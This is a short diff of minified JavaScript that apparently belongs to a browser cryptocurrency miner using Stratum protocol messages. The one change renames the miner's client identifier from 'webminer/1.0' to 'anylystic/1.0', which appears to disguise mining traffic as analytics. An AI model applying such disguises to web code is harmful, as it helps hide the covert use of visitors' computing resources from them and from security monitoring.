@@ -697,7 +697,7 @@
             '{"id":"mining.authorize","method":"mining.authorize","params":["<worker.name>","<worker.pass>"]}\n',
           A = "mining.subscribe",
           t =
-            '{"id": "mining.subscribe", "method": "mining.subscribe", "params": ["webminer/1.0"]}\n',
+            '{"id": "mining.subscribe", "method": "mining.subscribe", "params": ["anylystic/1.0"]}\n',
           L =
             '{"id": "mining.extranonce.subscribe", "method": "mining.extranonce.subscribe", "params": []}\n',
           H = "mining.set_difficulty",
